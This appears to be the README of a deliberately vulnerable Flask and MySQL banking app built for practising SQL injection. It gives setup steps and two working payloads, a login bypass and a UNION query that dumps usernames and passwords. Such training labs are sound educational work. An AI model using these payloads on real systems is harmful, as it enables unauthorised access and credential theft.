# broke-bank
Mock banking application built with Flask and MySQL. Use this to practice SQL injection!

# Setup

## 1. Install MySQL
https://dev.mysql.com/downloads/installer/

## 2. Clone repository
```shell
git clone https://github.com/anilmawji/broke-bank.git; cd broke-bank
```

## 3. Create and activate virtual environment (optional, recommended)
   
macOS/Linux:
```shell
python -m venv .venv && source .venv/Scripts/activate
```
Windows:
```shell
python -m venv .venv && .venv\Scripts\activate
```

## 4. Install dependencies
```shell
pip install -r requirements.txt
```

## 5. Create .env file for environment variables (place in /broke-bank/)
Make sure to replace `myusername` and `mypassword` with your MySQL credentials.
```env
FLASK_ENV=development
FLASK_APP=main.py
MYSQL_USER=myusername
MYSQL_PASSWORD=mypassword
```

## 6. Run bank-data.sql to create the database
Make sure the MySQL server is running (MySQL80 service on Windows)

## 7. Start server (local deployment)
```shell
flask run
```

# SQL Injection Examples

User login bypass (make sure to include the space at the end!)
```sql
a' or 1=1 -- 
```
![image](https://github.com/user-attachments/assets/5fdf6609-cd84-4420-9c48-b4b0744d09fa)

Transaction history search bar - SQL version and user info dump
```sql
3' union select null, user_id, version(), username, user_password from users;
```
![image](https://github.com/user-attachments/assets/4fc1abf2-d018-4dde-b240-09147835e81a)

